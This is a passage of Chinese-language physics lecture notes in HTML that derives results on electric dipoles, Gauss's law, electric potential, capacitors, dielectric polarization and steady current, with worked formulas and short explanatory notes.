   \tau = F \cdot \frac{d}{2} \sin \theta + F \cdot \frac{d}{2} \sin \theta = Fd \sin \theta = qEd \sin \theta
   = pE \sin \theta
\]</div>
<div class="arithmatex">\[
    \boldsymbol{p}=q\boldsymbol{d} \\
    \boldsymbol{\tau}= \boldsymbol{p} \times \boldsymbol{E}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>电偶极矩在电场中受到的力矩会驱使电偶极矩旋转上与电场方向对齐</p>
</div>
<p>对于电偶极矩在电场中的势能</p>
<div class="arithmatex">\[
\begin{align*}
  W &amp;=\int dw = \int_{\theta_0}^{\theta} \tau \cdot d\theta = - \int_{\theta_0}^{\theta} pE \sin \theta d\theta \\ 
  &amp;= pE(\cos \theta - \cos \theta_0) \\
  \Delta U &amp;= U(\theta) - U(\theta_0)=-W\\
           &amp;= pE(\cos \theta_0 - \cos \theta)\\
  \theta_0 &amp;= \frac{\pi}{2}, U(\theta_0) = 0\\
 U(\theta) &amp;= -pE\cos \theta= -\boldsymbol{p} \cdot \boldsymbol{E}
\end{align*}
\]</div>
<p>第一个式子的负号是因为力矩与角度的变化方向相反</p>
<h2 id="note-physics-eletronic-gausss-law">Gauss's Law(高斯定理)<a class="headerlink" href="#note-physics-eletronic-gausss-law" title="Permanent link">&para;</a></h2>
<h3 id="note-physics-eletronic-_4">电场的高斯定理<a class="headerlink" href="#note-physics-eletronic-_4" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>The net electric flux through any closed surface is proportional to the charge enclosed by that surface.</p>
<div class="arithmatex">\[
   \Phi = \oiint \boldsymbol{E} \cdot d\boldsymbol{A} = \frac{q_{enc}}{\varepsilon_0}
\]</div>
<p><strong>E不一定只由q产生，但是q只用计算被包裹住的电荷</strong></p>
</div>
<p>在数学分析二中，我们也知道Gauss公式，即：</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>设 <span class="arithmatex">\(\Omega\)</span> 是分段光滑的封闭曲面构成的二维单连通区域，函数 <span class="arithmatex">\(P(x,y,z),Q(x,y,z),R(x,y,z)\)</span> 在 $\Omega $ 上具有连续偏导数,
则</p>
<div class="arithmatex">\[
  \iiint_{\Omega} \left( \frac{\partial P}{\partial x} + \frac{\partial Q}{\partial y} + \frac{\partial R}{\partial z} \right) dV = \iint_{\partial \Omega} Pdydz + Qdzdx + Rdxdy
\]</div>
</div>
<p>将两者结合起来，我们就可以得到高斯定理的微分形式</p>
<div class="arithmatex">\[
   \Phi=\oiint \boldsymbol{E} \cdot d\boldsymbol{A} = \iiint \nabla \cdot \boldsymbol{E} dV
\]</div>
<p>而</p>
<div class="arithmatex">\[
     \frac{q_{enc}}{\varepsilon_0}= \iiint \frac{\rho}{\varepsilon_0} dV 
\]</div>
<p>所以</p>
<div class="arithmatex">\[
   \nabla \cdot \boldsymbol{E} = \frac{\rho}{\varepsilon_0}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p><strong>运用高斯定理可以通过电荷求电场，也可以通过电场求电荷</strong>，关键在于高斯面的选取，一般而言，选取球面，圆柱面，或者长方体表面更加方便计算，高斯定理只是再计算一些具有特殊对称性物体时，非常的方便，对于一般的物体，还是要用库仑定律来计算</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>我们知道导体内部的电场是0，由高斯定理，导体的内部没有电荷，所以其电荷分布在表面。</p>
</div>
<h3 id="note-physics-eletronic-_5">静电场的环路定律<a class="headerlink" href="#note-physics-eletronic-_5" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">The circuit Law of the electrostatic field</p>
<div class="arithmatex">\[
\oint \boldsymbol{E} \cdot d\boldsymbol{l} = 0
\]</div>
<p>then</p>
<div class="arithmatex">\[
\nabla \times \boldsymbol{E} = 0
\]</div>
</div>
<p>这个是由Stokes定理推出的，即：</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>设 <span class="arithmatex">\(\Omega\)</span> 是光滑的曲面，其边界 <span class="arithmatex">\(\partial \Omega\)</span> 是分段光滑的闭曲线函数 <span class="arithmatex">\(P(x,y,z),Q(x,y,z),R(x,y,z)\)</span> 在 $\Omega，\partial \Omega $ 上具有连续偏导数,
则</p>
<div class="arithmatex">\[\begin{align*}
  \oint_{\partial \Omega} Pdx + Qdy + Rdz &amp;= \iint_{\Omega} \left( \frac{\partial R}{\partial y} - \frac{\partial Q}{\partial z} \right) dydz + \left( \frac{\partial P}{\partial z} - \frac{\partial R}{\partial x} \right) dzdx + \left( \frac{\partial Q}{\partial x} - \frac{\partial P}{\partial y} \right) dxdy\\
  &amp;= \left\lvert  \begin{matrix} \cos \alpha &amp; \cos \beta &amp; \cos \gamma \\ \frac{\partial}{\partial x} &amp; \frac{\partial}{\partial y} &amp; \frac{\partial}{\partial z} \\ P &amp; Q &amp; R \end{matrix} \right\rvert dS\\
  &amp;=  \left\lvert \begin{matrix} dydz &amp; dzdx &amp; dxdy \\ \frac{\partial}{\partial x} &amp; \frac{\partial}{\partial y} &amp; \frac{\partial}{\partial z} \\ P &amp; Q &amp; R \end{matrix} \right \lvert\\
  &amp;= \iint_{\Omega} \nabla \times \boldsymbol{F} \cdot d\boldsymbol{S}
\end{align*}\]</div>
</div>
<h2 id="note-physics-eletronic-electric-potential">Electric Potential(电势)<a class="headerlink" href="#note-physics-eletronic-electric-potential" title="Permanent link">&para;</a></h2>
<h3 id="note-physics-eletronic-_6">电势能与电势<a class="headerlink" href="#note-physics-eletronic-_6" title="Permanent link">&para;</a></h3>
<p>电势是电场中某一点的物理量，定义为单位正电荷在该点所具有的电势能。具体来说，电势 <span class="arithmatex">\( V \)</span> 可以表示为：</p>
<div class="arithmatex">\[ V = \frac{U}{q} \]</div>
<p>其中 <span class="arithmatex">\( U \)</span> 是电势能，<span class="arithmatex">\( q \)</span> 是电荷量。电势是一个标量，通常相对于无限远处的电势为零来计算。</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>计算某点a的电势的可以使用从该点到无穷远的电场的积分：</p>
<div class="arithmatex">\[
V = \int_{a}^{\infty} \boldsymbol{E} \cdot d\boldsymbol{l}
\]</div>
<p>因为<span class="arithmatex">\(W_{a}^{\infty}=-U_{a}^{\infty}=U_a-U_{\infty}\)</span>,而 <span class="arithmatex">\(U_{\infty}=0\)</span>,<span class="arithmatex">\(W=\int q \boldsymbol{E} \cdot d\boldsymbol{l}\)</span>,<span class="arithmatex">\(V = \frac{U}{q}\)</span></p>
</div>
<p>根据这个式子可以得到 <strong>点电荷产生的电势</strong></p>
<div class="arithmatex">\[
V = \frac{q}{4 \pi \varepsilon_0 r}
\]</div>
<p>根据点电荷产生的电势，可以得到电偶极矩产生的电势</p>
<div align=center><img src="../NOTE/Physics/img/part1/7.png" width=55%/></div>

<div class="arithmatex">\[\begin{align*}
  V &amp;= \dfrac{q}{4 \pi \varepsilon_0} \left( \frac{1}{r_1} - \frac{1}{r_2} \right)\\
    &amp;=  \dfrac{q}{4 \pi \varepsilon_0} \left( \frac{r_1-r_2}{r_1r_2}\right)
\end{align*}\]</div>
<p>当 <span class="arithmatex">\(r &gt;&gt; a\)</span>, <span class="arithmatex">\(r_1 \approx r_2 \approx r\)</span>，所以<span class="arithmatex">\(r_1-r_2 \approx 2a\cos \theta,r_1r_2 \approx r^2,p=2aq\)</span></p>
<div class="arithmatex">\[\begin{align*}
  V &amp;=  \dfrac{q}{4 \pi \varepsilon_0} \left( \dfrac{2a \cos \theta}{r^2}\right)\\
    &amp;=  \dfrac{p \cos \theta}{4 \pi \varepsilon_0 r^2}\\
    &amp;=  \dfrac{p \cdot \hat{r}}{4 \pi \varepsilon_0 r^2}
\end{align*}\]</div>
<p><span class="arithmatex">\(\theta = \frac{\pi}{2},V=0;\theta=0,V_{max}&gt;0;\theta=\pi,V_{min}&lt;0\)</span></p>
<p>也可以推导电四偶极矩的电势</p>
<div align=center><img src="../NOTE/Physics/img/part1/8.png" width=55%/></div>

<div class="arithmatex">\[\begin{align*}
V(r) &amp;= \sum_i V_i(r_i) \\
     &amp;= \frac{1}{4 \pi \epsilon_0} \left( \frac{q}{r - d} + \frac{-2q}{r} + \frac{q}{r + d} \right) \\
     &amp;= \frac{1}{4 \pi \epsilon_0} \frac{2 q d^2}{r(r^2 - d^2)} \\
     &amp;= \frac{1}{4 \pi \epsilon_0} \frac{2 q d^2}{r^3 \left( 1 - \frac{d^2}{r^2} \right)}
\end{align*}\]</div>
<div class="arithmatex">\[For \enspace d &lt;&lt; r, \frac{d^2}{r^2} &lt;&lt; 1 \\ V(r) = \frac{2 q d^2}{4 \pi \epsilon_0 r^3} = \frac{Q}{4 \pi \epsilon_0 r^3}\]</div>
<p>其中 <span class="arithmatex">\(Q = 2qd^2\)</span> 是电四偶极矩</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>对于点电荷， <span class="arithmatex">\(V \propto \frac{1}{r}\)</span>, 对于电偶极矩，<span class="arithmatex">\(V \propto \frac{1}{r^2}\)</span>, 对于电四偶极矩，<span class="arithmatex">\(V \propto \frac{1}{r^3}\)</span></p>
</div>
<details class="eg">
<summary>通过测量电势判断电荷的分布</summary>
<p>$$
  V\left(r\right)= \frac{1}{4 \pi \epsilon_0} \left( \frac{A_1}{r} + \frac{A_2}{r^2} + \frac{A_3}{r^3} + \dots \right) \
      = \frac{1}{4 \pi \epsilon_0} \sum_i \frac{A_i}{r^i}
  $$</p>
</details>
<h3 id="note-physics-eletronic-_7">球壳的电势<a class="headerlink" href="#note-physics-eletronic-_7" title="Permanent link">&para;</a></h3>
<div align=center><img src="../NOTE/Physics/img/part1/9.png" width=45%/></div>

<p>利用Guass定理，我们可以得到球壳的电场分布：</p>
<p>在球壳内部，电场为0，在球壳外部，电场为点电荷产生的电场</p>
<p>则对于距离球心距离为 <span class="arithmatex">\(r\)</span> 的点，其电势有以下两种情况</p>
<ul>
<li><span class="arithmatex">\(r &lt; R\)</span>，则 <span class="arithmatex">\(V = \int_{r}^{R} E \cdot dr + \int_{R}^{+\infty} E \cdot dr = 0 + \frac{q}{4 \pi \epsilon_0 R}\)</span>  </li>
<li><span class="arithmatex">\(r &gt; R\)</span>，则 <span class="arithmatex">\(V = \int_{r}^{+\infty}= \frac{q}{4 \pi \epsilon_0 r}\)</span> </li>
</ul>
<p>对于该球壳的电势能，可以将其分隔为很多个小电荷，然后对每个小电荷的电势能求和，由于<span class="arithmatex">\(ij\)</span>对称性，要乘以<span class="arithmatex">\(\frac{1}{2}\)</span></p>
<div class="arithmatex">\[\begin{align*}
U &amp;= \sum_{i,j=1 (j &gt; i)}^{n} \frac{q_i q_j}{4 \pi \varepsilon_0 r_{ij}} \\
  &amp;= \frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \frac{q_i q_j}{4 \pi \varepsilon_0 r_{ij}} \\
  &amp;= \frac{1}{2} \sum_{i=1}^{n} q_i V_i \\
  &amp;= \frac{1}{2} \int V dq = \frac{1}{2} \cdot \frac{q}{4 \pi \varepsilon_0 R} \cdot q \\
  &amp;= \frac{q^2}{8 \pi \varepsilon_0 R}
\end{align*}\]</div>
<div class="admonition note">
<p class="admonition-title">解释</p>
<p>固定 <span class="arithmatex">\(i\)</span> ,先对 <span class="arithmatex">\(j\)</span> 求和，相当于整个球壳在 <span class="arithmatex">\(i\)</span> 产生的电势 <span class="arithmatex">\(V_i\)</span> ，再对 <span class="arithmatex">\(i\)</span> 求和，此时由于球壳内和球壳上的电势都是 <span class="arithmatex">\(\dfrac{q}{4 \pi \epsilon_0 R}\)</span> ,所以最后只需要对于球壳上的电荷求和即可，通过结果我们可以发现 <strong>电势能蕴藏在电场中</strong></p>
</div>
<details class="eg">
<summary>估算电子的半径</summary>
<p>电子的电势能与其原子能相等，这样处于平衡状态</p>
<div class="arithmatex">\[\begin{align*}
W &amp;= mc^2 = \frac{e^2}{8 \pi \varepsilon_0 R} \\
R &amp;= \frac{e^2}{8 \pi \varepsilon_0 mc^2} \approx 1.4 \times 10^{-15} \ m
\end{align*}\]</div>
</details>
<h3 id="note-physics-eletronic-_8">通过电势求电场<a class="headerlink" href="#note-physics-eletronic-_8" title="Permanent link">&para;</a></h3>
<p>由于我们有</p>
<div class="arithmatex">\[
  V_{a}^{b} = -\int_{a}^{b} \boldsymbol{E} \cdot d\boldsymbol{l}
\]</div>
<p>故</p>
<div class="arithmatex">\[
    dV = -\boldsymbol{E} \cdot d\boldsymbol{l}
\]</div>
<div class="arithmatex">\[
  \boldsymbol{E} = - \frac{dV}{dl}= - \nabla V
\]</div>
<p>即求某一方向的电场，只需要求该方向的电势的偏导数即可</p>
<div class="admonition note">
<p class="admonition-title">射影法求电场</p>
<p>通过电场线的类似性构造新的电荷来求电场；例如感应在无穷长的导体板上的电场，可以类似于在对称的位置上放上一个点电荷
<div align=center><img src="../NOTE/Physics/img/part1/10.png" width=50%></div></p>
</div>
<h2 id="note-physics-eletronic-capacitance">Capacitance(电容)<a class="headerlink" href="#note-physics-eletronic-capacitance" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>电容器的电容定义为</p>
<div class="arithmatex">\[
C = \frac{q}{V}
\]</div>
<p>其中 <span class="arithmatex">\(q\)</span> 是电容器上的电荷，<span class="arithmatex">\(V\)</span> 是电容器上的电势差</p>
</div>
<h3 id="note-physics-eletronic-_9">平行板电容器<a class="headerlink" href="#note-physics-eletronic-_9" title="Permanent link">&para;</a></h3>
<div align=center><img src="../NOTE/Physics/img/part1/11.png" width=50%/></div>

<div class="arithmatex">\[
  V=\int_{a}^{b} \boldsymbol{E} \cdot d\boldsymbol{l} = E \cdot d = \frac{\sigma}{\varepsilon_0}d
\]</div>
<div class="arithmatex">\[
  C = \frac{q}{V} = \dfrac{\sigma A}{\frac{\sigma}{\varepsilon_0}d}= \frac{\varepsilon_0 A}{d}
\]</div>
<p>故平行板电容器的电容与板的面积成正比，与板的距离成反比，即与电容器的几何参数有关</p>
<h3 id="note-physics-eletronic-_10">圆柱电容器<a class="headerlink" href="#note-physics-eletronic-_10" title="Permanent link">&para;</a></h3>
<div align=center><img src="../NOTE/Physics/img/part1/12.png" width=50%/></div>

<p>首先用高斯定律计算电场</p>
<div class="arithmatex">\[
  E \cdot 2 \pi r l = \frac{\lambda l}{\varepsilon_0} \Rightarrow E = \frac{\lambda}{2 \pi \varepsilon_0 r}
\]</div>
<div class="arithmatex">\[
  V = \int_{a}^{b} E \cdot dr = \int_{a}^{b} \frac{\lambda}{2 \pi \varepsilon_0 r} dr = \frac{\lambda}{2 \pi \varepsilon_0} \ln \frac{b}{a}
\]</div>
<div class="arithmatex">\[
  C = \frac{q=\lambda l}{V} = \frac{2 \pi \varepsilon_0 l}{\ln \frac{b}{a}}
\]</div>
<p>那么对于单位长度的电容，有</p>
<div class="arithmatex">\[
  C' = \frac{C}{l} = \frac{2 \pi \varepsilon_0}{\ln \frac{b}{a}}
\]</div>
<h3 id="note-physics-eletronic-_11">球形电容器<a class="headerlink" href="#note-physics-eletronic-_11" title="Permanent link">&para;</a></h3>
<div align=center><img src="../NOTE/Physics/img/part1/13.png" width=50%/></div>

<div class="arithmatex">\[
  E \cdot 4 \pi r^2 = \frac{q}{\varepsilon_0} \Rightarrow E = \frac{q}{4 \pi \varepsilon_0 r^2}
\]</div>
<div class="arithmatex">\[
  V = \int_{a}^{b} E \cdot dr = \int_{a}^{b} \frac{q}{4 \pi \varepsilon_0 r^2} dr = \frac{q}{4 \pi \varepsilon_0} \left( \frac{1}{a} - \frac{1}{b} \right)
\]</div>
<div class="arithmatex">\[
  C = \frac{q}{V} = 4 \pi \varepsilon_0 \frac{ab}{b-a}
\]</div>
<div class="admonition property">
<p class="admonition-title">Property</p>
<p>特别的，当 <span class="arithmatex">\(b \to \infty\)</span> 时，<span class="arithmatex">\(C = 4 \pi \varepsilon_0 a\)</span>,这说明电容并不一定需要两个，一个导体也可以作为电容</p>
</div>
<h3 id="note-physics-eletronic-_12">电容器的并联和串联<a class="headerlink" href="#note-physics-eletronic-_12" title="Permanent link">&para;</a></h3>
<h4 id="note-physics-eletronic-_13">并联(电压一致)<a class="headerlink" href="#note-physics-eletronic-_13" title="Permanent link">&para;</a></h4>
<div align=center><img src="../NOTE/Physics/img/part1/14.png" width=50%/></div>

<div class="arithmatex">\[
  V=\frac{Q_1}{C_1}=\frac{Q_2}{C_2} \Rightarrow Q = Q_1 + Q_2 = C_1 V + C_2 V = (C_1 + C_2) V
\]</div>
<div class="arithmatex">\[
  C = \frac{Q}{V} = C_1 + C_2
\]</div>
<h4 id="note-physics-eletronic-_14">串联(电荷一致)<a class="headerlink" href="#note-physics-eletronic-_14" title="Permanent link">&para;</a></h4>
<div align=center><img src="../NOTE/Physics/img/part1/15.png" width=50%/></div>

<div class="arithmatex">\[
  Q = Q_1 = Q_2 = C_1 V_1 = C_2 V_2
\]</div>
<div class="arithmatex">\[
  V = V_1 + V_2 = \frac{Q}{C_1} + \frac{Q}{C_2} = Q \left( \frac{1}{C_1} + \frac{1}{C_2} \right)
\]</div>
<div class="arithmatex">\[
  C = \frac{Q}{V} = \frac{1}{\frac{1}{C_1} + \frac{1}{C_2}}
\]</div>
<div class="arithmatex">\[
  \frac{1}{C} = \frac{1}{C_1} + \frac{1}{C_2}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>串联电容器的电容是并联电容器的倒数的和，而并联电容器的电容是串联电容器的和，这恰好跟电阻的串联和并联相反</p>
</div>
<h3 id="note-physics-eletronic-_15">电容器的能量<a class="headerlink" href="#note-physics-eletronic-_15" title="Permanent link">&para;</a></h3>
<p>考虑一个平行板电容器，其电容为 <span class="arithmatex">\(C\)</span>，电压为 <span class="arithmatex">\(V\)</span>，则其具有的能量相当于从负极板不断将电荷移动到正极板，这样的过程中克服电场力所做的功</p>
<div class="arithmatex">\[
  U= \int_{0}^{Q} V dq = \int_{0}^{Q} \frac{q}{C} dq = \frac{Q^2}{2C} = \frac{1}{2} CV^2
\]</div>
<p>它的能量储存在它的电场中；由于<span class="arithmatex">\(V=Ed\)</span>;</p>
<div class="arithmatex">\[
  U = \frac{1}{2} \varepsilon_0 E^2 A d
\]</div>
<p>这样就得到单位体积的电场能量密度</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<div class="arithmatex">\[
  \mu=\frac{U}{V} = \frac{1}{2} \varepsilon_0 E^2 
\]</div>
</div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>虽然公式是由平行板电容器推导出来的，但是这个公式以及能量密度公式对于任何电容器都是成立的</p>
</div>
<h3 id="note-physics-eletronic-_16">电介质，电场中的绝缘体<a class="headerlink" href="#note-physics-eletronic-_16" title="Permanent link">&para;</a></h3>
<p>影响电容还有另外一个十分重要的因素，介电常数<span class="arithmatex">\(\kappa_e\)</span>,当电容器中插入电介质时，电容器的电容会增加，具体为</p>
<div class="arithmatex">\[
  C=C_0 \kappa_e
\]</div>
<h4 id="note-physics-eletronic-_17">宏观解释<a class="headerlink" href="#note-physics-eletronic-_17" title="Permanent link">&para;</a></h4>
<ul>
<li>在平行板电容器中插入一根导体，其表面会产生感应电荷，相当于两个电容器串联</li>
</ul>
<div align=center><img src="../NOTE/Physics/img/part1/16.png" width=50%/></div>

<div class="arithmatex">\[\begin{align*}
  C_1 &amp;= \varepsilon_0 \frac{A}{d_1} \\
  C_2 &amp;= \varepsilon_0 \frac{A}{d_2} \\
  C&amp;=\frac{C_1C_2}{C_1+C_2}=\varepsilon_0 \frac{A}{d_1+d_2}
\end{align*}\]</div>
<p>电容变大了，但是不能插入的导体不能太厚，否则间隙太小，很容易就达到空气的击穿电压，所以即使导体能很很好的增加电容，我们也不使用，而是使用其他的电介质</p>
<ul>
<li>在平行板电容器中插入一根电介质，使其充满间隙；其表面会产生束缚电荷，在介质之间会产生感应电场，抵消掉原电场的一部分（但是不为0）；两极板间的电场减小，电压减小，电荷量不变，电容增大；此时我们称该介质被极化(polarization)了</li>
</ul>
<div align=center><img src="../NOTE/Physics/img/part1/17.png" width=50%/></div>

<div class="admonition info">
<p class="admonition-title">Info</p>
<p>其实，在英文的教材中，不管是感应电荷还是束缚电荷，都使用 <strong>induced charge</strong> 来表示，在中文中，我们为了区分导体产生的与非导体产生的，所以使用了不同的词汇</p>
</div>
<h4 id="note-physics-eletronic-_18">极化微观解释<a class="headerlink" href="#note-physics-eletronic-_18" title="Permanent link">&para;</a></h4>
<div class="admonition definiton">
<p class="admonition-title">Definiton</p>
<ul>
<li>Non-polar dielectrics:无极分子电介质，指的是分子中的正负电荷中心重合，如氧气，氮气， 二氧化碳等</li>
<li>Polar dielectrics:有极分子电介质，指的是分子中的正负电荷中心不重合，如水</li>
</ul>
</div>
<p>对于 Non-polar dielectrics，当电场作用于其上时，它会将重合的正负电荷中心分开，形成电偶极矩，这样就会产生一个与电场方向相反的电场，从而减小了电场强度(内部的电场矢量求和之后，相当于在表面分别产生正负电荷)</p>
<div align=center><img src="../NOTE/Physics/img/part1/18.png" width=50%/></div>

<div class="admonition note">
<p class="admonition-title">Note</p>
<p>其本质是电子云位移的结果</p>
</div>
<p>对于 Polar dielectrics，当电场作用于其上时，它会给原本杂乱无章的电偶极矩一个力矩，<a href="http://www.kailqq.cc/NOTE/Physics/eletronic/#电偶极矩在电场中">这个力矩会使得电偶极矩偏向电场方向</a>，这样的极化叫做 <strong>取向极化</strong></p>
<div align=center><img src="../NOTE/Physics/img/part1/19.png" width=50%/></div>

<div class="admonition note">
<p class="admonition-title">Note</p>
<p>当取向极化发生时，电子云的位移也会发生，但是彼此差了两个量级，一般忽略了电子云的位移；但是当外部电场变化频率很大时，电偶极矩转来转去是跟不上的，但是电子云的左右移动是可以的，这时候电子云的位移是主要影响的因素</p>
</div>
<h3 id="note-physics-eletronic-polarization">极化强度矢量(Polarization)<a class="headerlink" href="#note-physics-eletronic-polarization" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>极化强度矢量 <span class="arithmatex">\(\boldsymbol{P}\)</span> 定义为单位体积内的电偶极矩之和</p>
<div class="arithmatex">\[
\boldsymbol{P} = \frac{\sum \boldsymbol{p}}{\Delta V}
\]</div>
<p>其中 <span class="arithmatex">\(\boldsymbol{p}\)</span> 是单位体积内的电偶极矩;</p>
<p><span class="arithmatex">\(P\)</span> 可能是均匀的，也可能是不均匀的</p>
</div>
<p>对于任意的电介质，在其表面取一个小斜圆筒，母线与电场方向一致，长度为一个电偶长度；底面与该表面的法向量垂直，这样斜斜圆筒内只可能有正电荷；</p>
<div align=center><img src="../NOTE/Physics/img/part1/20.png" width=50%/></div>

<p>设 <span class="arithmatex">\(n\)</span> 为单位体积内的电偶极矩数目(分子数目)
则</p>
<div class="arithmatex">\[\begin{align*}
    \boldsymbol{P} &amp;= \frac{\sum \boldsymbol{p}}{\Delta V} = nql\\
    dN&amp;=ndV=nldA \cos \theta \\
    dq'&amp;=qdN=nql dA\cos \theta \\
       &amp;=\boldsymbol{p} \cdot \boldsymbol{dA}
\end{align*}\]</div>
<p>所以</p>
<div class="arithmatex">\[
  \oiint \boldsymbol{P} \cdot d\boldsymbol{A} = \sum_{out} q'=-\sum_{in} q'
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>极化强度矢量与闭合曲面的内积积分等于该曲面表面的束缚电荷，等于该曲面内部电荷的相反数(外面有多少正的，里面就有多少负的)</p>
</div>
<p>同时</p>
<div class="arithmatex">\[
   \sigma' = \dfrac{dq'}{dA} = \boldsymbol{P} \cdot \boldsymbol{n}
\]</div>
<p>面电荷密度等于极化强度矢量在法向上的分量；由夹角来控制正负</p>
<div align=center><img src="../NOTE/Physics/img/part1/21.png" width=50%/></div>

<h3 id="note-physics-eletronic-_19">电介质的极化规律<a class="headerlink" href="#note-physics-eletronic-_19" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>在各向异性的介质中，极化强度矢量是电场的函数，在各项同性的材料中<span class="arithmatex">\(\boldsymbol{P}=\varepsilon_0 \chi_e E\)</span></p>
<p>其中 <span class="arithmatex">\(\chi_e\)</span> 是电介质的电极化率，与介电常数的关系为 <span class="arithmatex">\(\kappa_e = 1 + \chi_e\)</span></p>
</div>
<h3 id="note-physics-eletronic-guass">Guass定律的推广<a class="headerlink" href="#note-physics-eletronic-guass" title="Permanent link">&para;</a></h3>
<p>考虑一个正电荷 <span class="arithmatex">\(q_0\)</span> 放在电介质中，其周围会产生极化</p>
<div align=center><img src="../NOTE/Physics/img/part1/22.png" width=50%/></div>

<p>由 高斯定理，我们可以得到</p>
<div class="arithmatex">\[
    \varepsilon_0 \oiint \boldsymbol{E} \cdot d\boldsymbol{A} = q_0 + q'
\]</div>
<div class="arithmatex">\[  
  \oiint \boldsymbol{P} \cdot d \boldsymbol{A} = -q'
\]</div>
<div class="arithmatex">\[ \varepsilon_0 \oiint \boldsymbol{E} \cdot d\boldsymbol{A} = q_0 - \oiint \boldsymbol{P} \cdot d\boldsymbol{A} \]</div>
<div class="arithmatex">\[  \oiint(\varepsilon_0 \boldsymbol{E} + \boldsymbol{P}) \cdot d\boldsymbol{A} = q_0 \]</div>
<div class="arithmatex">\[ \oiint \boldsymbol{D} \cdot d\boldsymbol{A} = q_0 \]</div>
<p>其中 <span class="arithmatex">\(\boldsymbol{D} = \varepsilon_0 \boldsymbol{E} + \boldsymbol{P}\)</span> 称为电位移矢量，也叫做电感应矢量</p>
<p>这说明电位移矢量与闭合曲面内积面积分等于该曲面内的 <strong>自由电荷</strong> 之和</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<div class="arithmatex">\[
  \boldsymbol{D} = \varepsilon_0 \boldsymbol{E} + \boldsymbol{P} = (1+ \chi_e)\varepsilon_0 \boldsymbol{E} =\kappa_e \varepsilon_0 \boldsymbol{E}
\]</div>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>在上面的例子中</p>
<div class="arithmatex">\[\begin{align*}
  \oiint \vec{D} \cdot d\vec{A} &amp;= \sum q_0 \\
  4 \pi r^2 D &amp;= q_0 \\
  D &amp;= \frac{q_0}{4 \pi r^2} \\
  E &amp;= \frac{D}{\kappa_e \varepsilon_0} = \frac{q_0}{4 \pi \varepsilon_0 \kappa_e r^2} = \frac{E_0}{\kappa_e}
\end{align*}\]</div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><span class="arithmatex">\(E\)</span>是真实电场，<span class="arithmatex">\(E_0\)</span>真空中的电场</p>
</div>
<h2 id="note-physics-eletronic-_20">恒定电流<a class="headerlink" href="#note-physics-eletronic-_20" title="Permanent link">&para;</a></h2>
<h3 id="note-physics-eletronic-_21">电流与电流密度<a class="headerlink" href="#note-physics-eletronic-_21" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">电流</p>
<p>电流定义为单位时间内通过某一横截面的电荷量</p>
<div class="arithmatex">\[
I = \frac{dq}{dt}
\]</div>
<p>若单位体积内电荷数目为 <span class="arithmatex">\(n\)</span>，截面表面积为 <span class="arithmatex">\(s\)</span> 电荷为 <span class="arithmatex">\(e\)</span>，速度为 <span class="arithmatex">\(v\)</span>，则电流为</p>
<div class="arithmatex">\[
I = nesv
\]</div>
</div>
<div class="admonition definition">
<p class="admonition-title">电流密度</p>
<p>电流密度定义为单位时间内通过单位面积的电荷量</p>
<div class="arithmatex">\[
\boldsymbol{J} = \frac{d\boldsymbol{I}}{d\boldsymbol{A}}
\]</div>
<p>其中 <span class="arithmatex">\(\boldsymbol{J}\)</span> 是电流密度，<span class="arithmatex">\(\boldsymbol{I}\)</span> 是电流，<span class="arithmatex">\(\boldsymbol{A}\)</span> 是横截面积</p>
<p>有：</p>
<div class="arithmatex">\[
   i=\oiint \boldsymbol{J} \cdot d\boldsymbol{A}
\]</div>
<p>在微小变化中，有</p>
<div class="arithmatex">\[
  j = nev
\]</div>
</div>
<h3 id="note-physics-eletronic-_22">电阻与电导<a class="headerlink" href="#note-physics-eletronic-_22" title="Permanent link">&para;</a></h3>
<p>电阻的定义式</p>
<div class="arithmatex">\[
  R = \frac{dV}{dI}
\]</div>
<p>电阻是决定式</p>
<div class="arithmatex">\[
  R = \rho \frac{l}{A} = \frac{l}{\sigma A}
\]</div>
<p>其中 <span class="arithmatex">\(\rho\)</span> 是电阻率，<span class="arithmatex">\(\sigma\)</span> 是电导率</p>
<p>对于不规则物体，采用积分计算电阻</p>
<details class="eg">
<summary>计算电阻</summary>
<p><div align=center><img src="../NOTE/Physics/img/part1/23.png" width=60%/></div></p>
<p>在地质勘探中，时常利用这种方法来勘探地底的资源，因为各种材料的电导率不同</p>
</details>
<div class="admonition key-point">
<p class="admonition-title">欧姆定律的微分形式</p>
<div class="arithmatex">\[
   di = \frac{dv}{R} \quad dv= E \cdot dl
\]</div>
<div class="arithmatex">\[
    \boldsymbol{J} \cdot d \boldsymbol{A} = di
\]</div>
<div class="arithmatex">\[
    R=\rho \frac{dl}{dA}
\]</div>
<p>可以推出</p>
<div class="arithmatex">\[
    \boldsymbol{J} = \sigma \boldsymbol{E}
\]</div>
</div>
<h3 id="note-physics-eletronic-_23">电功率与焦耳定律<a class="headerlink" href="#note-physics-eletronic-_23" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">电功率</p>
<p>电功率定义为单位时间内电流做的功</p>
<div class="arithmatex">\[
P = \frac{dW}{dt} = \frac{dW}{dq} \frac{dq}{dt} = V \cdot I
\]</div>
